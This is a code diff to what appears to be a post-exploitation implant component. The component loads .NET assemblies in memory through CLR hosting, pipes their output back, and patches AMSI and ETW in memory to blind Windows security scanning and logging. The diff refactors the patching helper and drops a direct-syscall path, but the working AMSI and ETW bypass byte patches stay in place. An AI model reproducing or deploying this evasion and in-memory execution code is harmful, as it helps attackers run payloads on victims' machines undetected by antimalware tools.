@@ -29,11 +29,9 @@ unsigned char uHook[] = {
 
 #ifdef _X32
 unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-SIZE_T patchsize = 8;
 #endif
 #ifdef _X64
 unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-SIZE_T patchsize = 6;
 #endif
 
 struct Metadata
@@ -62,11 +60,13 @@ int executeSharp(LPVOID lpPayload)
 	_AssemblyPtr pAssembly = NULL;
 	SAFEARRAYBOUND rgsabound[1];
 	_MethodInfoPtr pMethodInfo = NULL;
+	SAFEARRAY* pSafeArray = NULL;
 	VARIANT retVal;
 	VARIANT obj;
-	SAFEARRAY* psaStaticMethodArgs;
-	SAFEARRAY* psaEntryPointParameters;
+	SAFEARRAY* psaStaticMethodArgs = NULL;
+	SAFEARRAY* psaEntryPointParameters = NULL;
 	VARIANT vtPsa;
+	HANDLE pipe = NULL;
 
 	char* pipeName = NULL;
 	char* appdomainName = NULL;
@@ -106,7 +106,8 @@ int executeSharp(LPVOID lpPayload)
 
 	// Convert to wchar
 	clrVersion_w = new wchar_t[metadata.clrVersionLength + 1];
-	mbstowcs(clrVersion_w, clrVersion, metadata.clrVersionLength + 1);
+	size_t converted= 0;
+	mbstowcs_s(&converted, clrVersion_w, metadata.clrVersionLength + 1, clrVersion, metadata.clrVersionLength + 1);
 	
 	arg_s = (unsigned char*)malloc(metadata.argsSize * sizeof(BYTE));;
 	memcpy(arg_s, data_ptr, metadata.argsSize);
@@ -115,7 +116,7 @@ int executeSharp(LPVOID lpPayload)
 	////////////////// Hijack stdout
 
 	// Create a pipe to send data
-	HANDLE pipe = CreateNamedPipeA(
+	pipe = CreateNamedPipeA(
 		pipeName, // name of the pipe
 		PIPE_ACCESS_OUTBOUND, // 1-way pipe -- send only
 		PIPE_TYPE_BYTE, // send data as a message stream
@@ -147,7 +148,7 @@ int executeSharp(LPVOID lpPayload)
 
 	rgsabound[0].cElements = metadata.assemblySize;
 	rgsabound[0].lLbound = 0;
-	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
+	pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
 
 	void* pvData = NULL;
 	hr = SafeArrayAccessData(pSafeArray, &pvData);
@@ -245,7 +246,7 @@ int executeSharp(LPVOID lpPayload)
 
 	// Convert to wchar
 	appdomainName_w = new wchar_t[metadata.appdomainLength+1];
-	mbstowcs(appdomainName_w, appdomainName, metadata.appdomainLength+1);
+	mbstowcs_s(&converted, appdomainName_w, metadata.appdomainLength + 1, appdomainName, metadata.appdomainLength + 1);
 
 	hr = pRuntimeHost->CreateDomain(appdomainName_w, NULL, &pAppDomainThunk);
 
@@ -344,7 +345,7 @@ int executeSharp(LPVOID lpPayload)
 		wtext[1] = L' '; // Separator
 
 
-		mbstowcs(wtext+2, (char*)arg_s, metadata.argsSize);
+		mbstowcs_s(&converted, wtext+2, metadata.argsSize, (char*)arg_s, metadata.argsSize);
 		szArglist = CommandLineToArgvW(wtext, &nArgs);
 
 		free(wtext);
@@ -353,12 +354,11 @@ int executeSharp(LPVOID lpPayload)
 
 		for (long i = 1; i < nArgs; i++) // Start a 1 - ignoring the fake process name
 		{
-			size_t converted;
 			size_t strlength = wcslen(szArglist[i]) + 1;
 			OLECHAR* sOleText1 = new OLECHAR[strlength];
 			char* buffer = (char*)malloc(strlength * sizeof(char));
 
-			wcstombs(buffer, szArglist[i], strlength);
+			wcstombs_s(&converted, buffer, strlength, szArglist[i], strlength);
 
 			mbstowcs_s(&converted, sOleText1, strlength, buffer, strlength);
 			BSTR strParam1 = SysAllocString(sOleText1);
@@ -388,9 +388,11 @@ int executeSharp(LPVOID lpPayload)
 
 Cleanup:
 
-	FlushFileBuffers(pipe);
-	DisconnectNamedPipe(pipe);
-	CloseHandle(pipe);
+	if (pipe != NULL) {
+		FlushFileBuffers(pipe);
+		DisconnectNamedPipe(pipe);
+		CloseHandle(pipe);
+	}
 
 	if (pEnumerator) {
 		pEnumerator->Release();
@@ -459,77 +461,10 @@ VOID Execute(LPVOID lpPayload)
 
 }
 
-INT InlinePatch(HANDLE pipe, LPVOID lpFuncAddress, UCHAR* patch, int patchsize) {
-#ifdef USE_SYSCALLS
-	PTEB pTEB = NULL;
-	PPEB pPEB = NULL;
-
-	// Get pointer to the TEB
-	pTEB = NtCurrentTeb();
-
-	// Get pointer to the PEB
-	pPEB = (PPEB)pTEB->ProcessEnvironmentBlock;
-	if (pPEB == NULL) {
-		return -1;
-	}
-
-	if (pPEB->OSMajorVersion == 10 && pPEB->OSMinorVersion == 0) {
-		ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
-#ifdef _X64
-		ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
-#else
-		switch (pPEB->OSBuildNumber) {
-		case 10240: // 1507
-		case 10586: // 1511
-		    ZwProtectVirtualMemory = &ZwProtectVirtualMemory10_1;
-			break;
-		case 14393: // 1607
-		    ZwProtectVirtualMemory = &ZwProtectVirtualMemory10_2;
-			break;
-		case 15063: // 1703
-		    ZwProtectVirtualMemory = &ZwProtectVirtualMemory10_3;
-			break;
-		case 16299: // 1709
-		case 17134: // 1803
-		case 17763: // 1809
-		case 18362: // 1903
-		case 18363: // 1909
-		case 19041: // 2004
-		case 19042: // 20H2
-		case 19043: // 21H1
-		case 19044: // 21H2
-		case 19045: // 22H2
-		    ZwProtectVirtualMemory = &ZwProtectVirtualMemory10_4;
-			break;
-		default:
-		    ReportErrorThroughPipe(pipe, "[CLRHOST] Unknown Windows Version: %d\n", pPEB->OSBuildNumber);
-			return -1;
-		}
-		
-#endif
-
-	}
-	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 1 && pPEB->OSBuildNumber == 7601) {
-		ZwProtectVirtualMemory = &ZwProtectVirtualMemory7SP1;
-		ZwWriteVirtualMemory = &ZwWriteVirtualMemory7SP1;
-	}
-	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 2) {
-		ZwProtectVirtualMemory = &ZwProtectVirtualMemory80;
-		ZwWriteVirtualMemory = &ZwWriteVirtualMemory80;
-	}
-	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 3) {
-		ZwProtectVirtualMemory = &ZwProtectVirtualMemory81;
-		ZwWriteVirtualMemory = &ZwWriteVirtualMemory81;
-	}
-	else {
-
-		return -2;
-	}
-#else
+INT InlinePatch(LPVOID lpFuncAddress, UCHAR* patch, int patchsize) {
 	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
 	ZwProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
 	ZwWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
-#endif
 
 	LPVOID lpBaseAddress = lpFuncAddress;
 	ULONG OldProtection, NewProtection;
@@ -567,7 +502,7 @@ BOOL PatchEtw(HANDLE pipe)
 		return -2;
 	}
 
-	return InlinePatch(pipe, lpFuncAddress, uHook, sizeof(uHook));
+	return InlinePatch(lpFuncAddress, uHook, sizeof(uHook));
 }
 
 BOOL PatchAmsi(HANDLE pipe)
@@ -587,13 +522,13 @@ BOOL PatchAmsi(HANDLE pipe)
 		return -2;
 	}
 
-	return InlinePatch(pipe, addr, amsipatch, sizeof(amsipatch));
+	return InlinePatch(addr, amsipatch, sizeof(amsipatch));
 }
 
 BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID* pRuntimeInfo) {
 	HRESULT hr;
 	ULONG fetched = 0;
-	DWORD vbSize;
+	DWORD vbSize = 260;
 	BOOL retval = FALSE;
 	wchar_t currentversion[260];
 
